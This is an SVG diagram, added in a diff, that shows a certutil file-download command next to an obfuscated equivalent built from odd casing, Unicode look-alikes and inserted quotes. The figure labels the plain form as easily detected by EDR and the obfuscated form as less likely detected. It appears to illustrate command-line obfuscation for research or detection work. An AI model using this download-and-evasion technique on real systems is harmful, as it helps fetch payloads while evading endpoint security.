@@ -1,0 +1,148 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!-- Created with Inkscape (http://www.inkscape.org/) -->
+
+<svg
+   width="350.19864mm"
+   height="69.066505mm"
+   viewBox="0 0 350.19864 69.066505"
+   version="1.1"
+   id="svg5"
+   inkscape:version="1.2.2 (b0a8486541, 2022-12-01)"
+   sodipodi:docname="example.svg"
+   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
+   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
+   xmlns="http://www.w3.org/2000/svg"
+   xmlns:svg="http://www.w3.org/2000/svg">
+  <sodipodi:namedview
+     id="namedview7"
+     pagecolor="#ffffff"
+     bordercolor="#666666"
+     borderopacity="1.0"
+     inkscape:showpageshadow="2"
+     inkscape:pageopacity="0.0"
+     inkscape:pagecheckerboard="0"
+     inkscape:deskcolor="#d1d1d1"
+     inkscape:document-units="mm"
+     showgrid="false"
+     inkscape:zoom="0.74029882"
+     inkscape:cx="750.37267"
+     inkscape:cy="376.87484"
+     inkscape:window-width="1920"
+     inkscape:window-height="1032"
+     inkscape:window-x="0"
+     inkscape:window-y="25"
+     inkscape:window-maximized="1"
+     inkscape:current-layer="layer2" />
+  <defs
+     id="defs2">
+    <rect
+       x="888.14777"
+       y="81.550494"
+       width="350.21473"
+       height="41.253087"
+       id="rect508" />
+    <rect
+       x="125.19816"
+       y="302.74603"
+       width="597.00177"
+       height="46.315475"
+       id="rect457" />
+    <rect
+       x="39.302979"
+       y="415.78198"
+       width="1312.3003"
+       height="134.33667"
+       id="rect440" />
+  </defs>
+  <g
+     inkscape:label="Layer 1"
+     inkscape:groupmode="layer"
+     id="layer1"
+     transform="translate(-7.687366,-49.069706)">
+    <rect
+       style="display:inline;fill:#000000;stroke-width:0.799531;stroke-linecap:square;stroke-linejoin:round"
+       id="rect111"
+       width="350.19864"
+       height="26.88973"
+       x="7.687366"
+       y="49.069706" />
+    <text
+       xml:space="preserve"
+       style="font-style:normal;font-weight:normal;font-size:7.05556px;line-height:1.25;font-family:sans-serif;display:inline;fill:#ffffff;fill-opacity:1;stroke:none;stroke-width:0.264583"
+       x="16.203794"
+       y="66.557297"
+       id="text219"><tspan
+         sodipodi:role="line"
+         id="tspan217"
+         style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-size:7.05556px;font-family:'Ubuntu Sans Mono';-inkscape-font-specification:'Ubuntu Sans Mono';fill:#ffffff;stroke-width:0.264583"
+         x="16.203794"
+         y="66.557297">certutil.exe -urlcache -split -f https://example.org/file.ext output.ext</tspan></text>
+  </g>
+  <g
+     inkscape:label="Layer 1 copy 2"
+     inkscape:groupmode="layer"
+     id="g467"
+     transform="translate(-7.687366,-6.8929306)">
+    <rect
+       style="display:inline;fill:#000000;stroke-width:0.799531;stroke-linecap:square;stroke-linejoin:round"
+       id="rect461"
+       width="350.19864"
+       height="26.88973"
+       x="7.687366"
+       y="49.069706" />
+    <text
+       xml:space="preserve"
+       style="font-style:normal;font-weight:normal;font-size:7.05556px;line-height:1.25;font-family:sans-serif;display:inline;fill:#ffffff;fill-opacity:1;stroke:none;stroke-width:0.264583"
+       x="16.203794"
+       y="66.557297"
+       id="text465"><tspan
+         sodipodi:role="line"
+         id="tspan463"
+         style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-size:7.05556px;font-family:'Ubuntu Sans Mono';-inkscape-font-specification:'Ubuntu Sans Mono';fill:#ffffff;stroke-width:0.264583"
+         x="16.203794"
+         y="66.557297">cErtUTil.eXe −ᵘʳlᶜ⵲aCʰᲪᵉ —Sᵖˡ᣻Iᵗ὆ /ᶠ h&quot;tt&quot;ps:/&quot;/e&quot;xample.o&quot;r&quot;g/&quot;f&quot;i&quot;le.e&quot;xt ouT&quot;P&quot;UT.eXT</tspan></text>
+  </g>
+  <g
+     inkscape:label="Layer 1 copy"
+     inkscape:groupmode="layer"
+     id="g450"
+     transform="translate(-7.2943648,-0.70889892)" />
+  <g
+     inkscape:groupmode="layer"
+     id="layer2"
+     inkscape:label="Layer 1 copy 1"
+     transform="translate(-7.687366,-49.069706)">
+    <text
+       xml:space="preserve"
+       transform="matrix(0.26458333,0,0,0.26458333,-19.414708,-3.1242024)"
+       id="text455"
+       style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-size:40px;line-height:1.25;font-family:Ubuntu;-inkscape-font-specification:Ubuntu;white-space:pre;shape-inside:url(#rect457);display:inline;fill:#ff0000;fill-opacity:1;stroke:none"><tspan
+         x="125.19727"
+         y="341.00212"
+         id="tspan628"><tspan
+           style="font-weight:bold;-inkscape-font-specification:'Ubuntu Bold'"
+           id="tspan626">Functionally equivalent to:</tspan></tspan></text>
+    <text
+       xml:space="preserve"
+       style="font-style:normal;font-weight:normal;font-size:5.64444px;line-height:1.25;font-family:sans-serif;fill:#000000;fill-opacity:1;stroke:none;stroke-width:0.264583"
+       x="295.88675"
+       y="72.485847"
+       id="text514"><tspan
+         sodipodi:role="line"
+         id="tspan512"
+         style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-size:5.64444px;font-family:'Ubuntu Sans';-inkscape-font-specification:'Ubuntu Sans';fill:#ff0000;stroke-width:0.264583"
+         x="295.88675"
+         y="72.485847">Easily detected by EDR</tspan></text>
+    <text
+       xml:space="preserve"
+       style="font-style:normal;font-weight:normal;font-size:5.64444px;line-height:1.25;font-family:sans-serif;fill:#00ff00;fill-opacity:1;stroke:none;stroke-width:0.264583"
+       x="274.6868"
+       y="97.479477"
+       id="text518"><tspan
+         sodipodi:role="line"
+         id="tspan516"
+         style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-size:5.64444px;font-family:'Ubuntu Sans';-inkscape-font-specification:'Ubuntu Sans';fill:#00ff00;stroke-width:0.264583"
+         x="274.6868"
+         y="97.479477">Not/less likely detected by EDR</tspan></text>
+  </g>
+</svg>
